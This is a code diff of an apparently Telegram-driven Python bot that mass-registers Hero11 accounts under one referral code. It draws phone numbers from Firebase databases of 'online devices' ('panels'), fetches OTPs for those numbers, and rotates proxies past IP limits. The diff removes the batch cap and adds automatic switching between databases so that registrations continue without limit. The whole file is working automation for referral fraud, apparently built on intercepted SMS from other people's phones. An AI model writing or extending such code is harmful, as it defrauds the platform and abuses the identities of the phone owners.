@@ -38,7 +38,6 @@ VERIFY_HTTP_TIMEOUT = 35
 SCAN_CHECK_TIMEOUT = 10
 BATCH_SIZE = 5
 TARGET_REGISTRATIONS = 2
-MAX_BATCHES = 3
 
 if not BOT_TOKEN or BOT_TOKEN == "ENTER_YOUR_BOT_TOKEN_HERE" or ":" not in BOT_TOKEN:
     print("❌ Invalid or missing BOT_TOKEN. Set BOT_TOKEN in Railway Variables.")
@@ -533,21 +532,18 @@ class AsyncHero11Client:
         return "SUCCESS"
 
     async def send_otp(self):
-        # 1. Must bind referral attribution first—abort if attribution fails so no fake/unreferred signup happens
         bound = await self.pre_bind()
         if not bound or not self.attribute_uuid:
             if self.last_error_kind == "IP_PROBLEM":
                 return "IP_PROBLEM"
             return "ATTRIBUTION_FAILED"
 
-        # 2. Verify number is genuinely unregistered
         check = await self.black_check()
         if check == "SKIP_EXISTS":
             return "SKIP_EXISTS"
         if check != "SUCCESS":
             return check
 
-        # 3. Request OTP
         clean_account = self.phone.replace("+91", "").lstrip("+")
         payload = {
             "account": clean_account,
@@ -605,7 +601,6 @@ class AsyncHero11Client:
                 return "REJECTED_OTP"
             if user_info.get("isRestricted") is True:
                 return "IP_LIMITED"
-            # Confirm account was actually created as a new referral (isNew != 2)
             if data_obj.get("isNew") == 2 or user_info.get("isNew") == 2:
                 return "ALREADY_EXISTS"
             self.access_token = token
@@ -615,7 +610,6 @@ class AsyncHero11Client:
             return "IP_LIMITED"
         if code in [100005, 102018, 102017, 40007]:
             return "ALREADY_EXISTS"
-        # Explicit API rejection (wrong/expired OTP) — don't loop forever on a rejected code
         return "REJECTED_OTP"
 
 async def check_numbers_parallel(phones_list: list, invite_code: str, reg_cache: dict, concurrency: int = 20):
@@ -795,7 +789,7 @@ class BatchBoardLogger:
 
         rows_text = "\n".join(rows) if rows else "<i>Scanning all unregistered online devices...</i>"
         board = (
-            f"⚡ <b>HERO11 AUTO BATCH REGISTRATION (BATCH #{batch_num}/{MAX_BATCHES})</b>\n\n"
+            f"⚡ <b>HERO11 AUTO BATCH REGISTRATION (BATCH #{batch_num})</b>\n\n"
             f"💎 <b>Panel:</b> <code>{html.escape(panel_name)}</code> (All Online Unregistered)\n"
             f"📊 <b>Batch Progress:</b> {done_count}/{len(slots)} (🟢 {ok_count} | 🔴 {fail_count}) • <b>Total:</b> {success_count}/{total_needed}\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -824,7 +818,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
-        f"⚙️ <b>Batch Mode:</b> All online unregistered devices (5 concurrent, Cap: 2 OTPs)\n\n"
+        f"⚙️ <b>Batch Mode:</b> Unlimited 5-slot batches with Firebase failover until {TARGET_REGISTRATIONS} verified\n\n"
         "Select an option below:"
     )
     await message.answer(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -1207,7 +1201,7 @@ async def cb_back_to_main(callback: types.CallbackQuery):
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
-        f"⚙️ <b>Batch Mode:</b> All online unregistered devices (5 concurrent, Cap: 2 OTPs)\n\n"
+        f"⚙️ <b>Batch Mode:</b> Unlimited 5-slot batches with Firebase failover until {TARGET_REGISTRATIONS} verified\n\n"
         "Select an option below:"
     )
     await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -1270,14 +1264,14 @@ async def cb_start_automation(callback: types.CallbackQuery):
     USER_DATA["is_running"] = True
     status_msg = await callback.message.answer(
         f"⚡ <b>Fast Batch Scan Started!</b>\n"
-        f"Scanning all online unregistered devices in parallel (5 per batch, max {TARGET_REGISTRATIONS} OTPs)...",
+        f"Unlimited 5-slot batches with automatic Firebase switching until {TARGET_REGISTRATIONS} verified...",
         parse_mode="HTML",
         reply_markup=get_main_menu()
     )
 
     async def run_batch_automation():
         import aiohttp
-        firebase_dbs = USER_DATA["firebase_dbs"]
+        firebase_dbs = list(USER_DATA["firebase_dbs"])
         current_code = USER_DATA["codes"][0].strip()
         total_needed = TARGET_REGISTRATIONS
         success_count = 0
@@ -1287,40 +1281,59 @@ async def cb_start_automation(callback: types.CallbackQuery):
         skipped_cids = set()
         reg_cache = {}
         batch_num = 0
+        fb_index = 0
         board = BatchBoardLogger(status_msg)
 
         try:
-            while success_count < total_needed and batch_num < MAX_BATCHES and USER_DATA["is_running"]:
-                grouped = await collect_grouped_unregistered_devices(
-                    firebase_dbs=firebase_dbs,
-                    invite_code=current_code,
-                    reg_cache=reg_cache,
-                    skipped_cids=skipped_cids,
-                    skipped_phones=skipped_phones,
-                    used_phones=used_phones,
-                    limit=25,
-                )
-
+            while success_count < total_needed and USER_DATA["is_running"]:
                 batch_candidates = []
-                for dev in grouped:
-                    for full_phone in dev["unreg_phones"]:
-                        if full_phone not in skipped_phones and full_phone not in used_phones:
-                            batch_candidates.append({
-                                "firebase_url": dev["firebase_url"],
-                                "db_panel_name": dev["db_panel_name"],
-                                "db_short_id": dev["db_short_id"],
-                                "cid": dev["cid"],
-                                "phone": full_phone,
-                            })
-                            if len(batch_candidates) >= BATCH_SIZE:
-                                break
-                    if len(batch_candidates) >= BATCH_SIZE:
+
+                while fb_index < len(firebase_dbs) and USER_DATA["is_running"]:
+                    active_fb = firebase_dbs[fb_index]
+                    grouped = await collect_grouped_unregistered_devices(
+                        firebase_dbs=[active_fb],
+                        invite_code=current_code,
+                        reg_cache=reg_cache,
+                        skipped_cids=skipped_cids,
+                        skipped_phones=skipped_phones,
+                        used_phones=used_phones,
+                        limit=25,
+                    )
+
+                    for dev in grouped:
+                        for full_phone in dev["unreg_phones"]:
+                            if full_phone not in skipped_phones and full_phone not in used_phones:
+                                batch_candidates.append({
+                                    "firebase_url": dev["firebase_url"],
+                                    "db_panel_name": dev["db_panel_name"],
+                                    "db_short_id": dev["db_short_id"],
+                                    "cid": dev["cid"],
+                                    "phone": full_phone,
+                                })
+                                if len(batch_candidates) >= BATCH_SIZE:
+                                    break
+                        if len(batch_candidates) >= BATCH_SIZE:
+                            break
+
+                    if batch_candidates:
                         break
+
+                    # Current Firebase DB has no more candidates; switch to next Firebase DB
+                    fb_index += 1
+                    if fb_index < len(firebase_dbs):
+                        next_panel = firebase_dbs[fb_index].split('//')[1].split('.')[0]
+                        await status_msg.edit_text(
+                            f"🔄 <b>Switching Firebase DB ({fb_index + 1}/{len(firebase_dbs)}):</b> <code>{html.escape(next_panel)}</code>...",
+                            parse_mode="HTML",
+                            reply_markup=get_main_menu()
+                        )
+                        await asyncio.sleep(1.0)
 
                 if not batch_candidates:
                     USER_DATA["is_running"] = False
                     await status_msg.edit_text(
-                        "🔴 <b>No verified unregistered online devices available.</b>\nAutomation stopped.",
+                        f"🔴 <b>All {len(firebase_dbs)} Firebase DB(s) scanned; no more unregistered online devices available.</b>\n"
+                        f"Completed: {success_count}/{total_needed} verified.",
                         parse_mode="HTML",
                         reply_markup=get_main_menu()
                     )
@@ -1444,7 +1457,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             await board.render(panel_name, batch_num, success_count, total_needed, slots)
                             return
 
-                        # Claim a referral slot BEFORE calling verify_otp so we never exceed 2 referrals
                         async with state_lock:
                             if success_count >= total_needed or cap_reached_event.is_set():
                                 cap_reached_event.set()
@@ -1454,7 +1466,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 await board.render(panel_name, batch_num, success_count, total_needed, slots, force=True)
                                 return
 
-                        # OTP arrived: force register without a timeout on network retries, but stop on explicit API rejection
                         attempt = 0
                         v_res = "NETWORK_RETRY"
                         while USER_DATA["is_running"]:
@@ -1510,7 +1521,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 if success_count >= total_needed:
                     break
 
-                if USER_DATA["is_running"] and batch_num < MAX_BATCHES:
+                if USER_DATA["is_running"]:
                     await asyncio.sleep(1.5)
 
             USER_DATA["is_running"] = False
